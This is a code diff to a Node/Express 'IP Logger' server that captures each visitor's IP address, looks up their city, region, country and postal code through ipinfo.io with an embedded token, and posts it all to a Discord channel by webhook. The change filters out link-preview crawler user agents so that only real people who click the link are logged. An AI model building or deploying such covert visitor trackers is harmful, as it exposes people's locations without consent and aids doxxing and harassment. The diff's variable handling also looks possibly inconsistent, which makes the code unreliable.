@@ -7,6 +7,11 @@ const botToken = process.env.bot_token;
 const channelID = process.env.channel_id;
 const port = process.env.port || 3000;
 
+const unwantedUserAgents = [
+  "Vercelbot/0.1 (+https://vercel.com/)",
+  "got (https://github.com/sindresorhus/got)"
+];
+
 async function sendWebhook(channelID, embed) {
   const createUrl = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
 
@@ -42,6 +47,9 @@ async function sendWebhook(channelID, embed) {
 
 app.get("/", async (req, res) => {
   const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const userAgent = req.headers["user-agent"];
+  if (unwantedUserAgents.includes(userAgent)) { res.status(200).send("Skipping unwanted User Agent"); 
+  return; } // Check if the current userAgent is in the unwantedUserAgents list
   const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
   const data = await response.json();
   const { region, city, country, postal } = data;
@@ -50,7 +58,7 @@ app.get("/", async (req, res) => {
   const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
   const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
-
+  
   try {
     const embed = new MessageBuilder()
       .setTitle("IP Logger")
